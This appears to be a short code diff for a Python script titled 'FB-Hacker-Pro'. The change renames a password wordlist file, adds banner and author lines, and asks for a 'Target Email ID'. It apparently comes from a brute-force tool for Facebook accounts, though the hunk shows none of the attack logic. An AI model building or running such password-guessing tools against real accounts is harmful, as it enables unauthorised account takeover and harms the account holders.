@@ -55,8 +55,11 @@ def function(email,passw,i):
 
 #payload=create_form()
 print('___________________________________________________________________________\n')
-file=open('passwords.txt','r')
+file=open('passwards.txt','r')
 i=0
+print(" --------------[FB-Hacker-Pro]---------------\n")
+print(" --------------------------------------------\n\n")
+print("    Author - Hein Arkar(Wtobe_Shining_Star) \n\n")
 email=input('Enter Email : ')
 print("")
 print("Target Email ID : ",email)
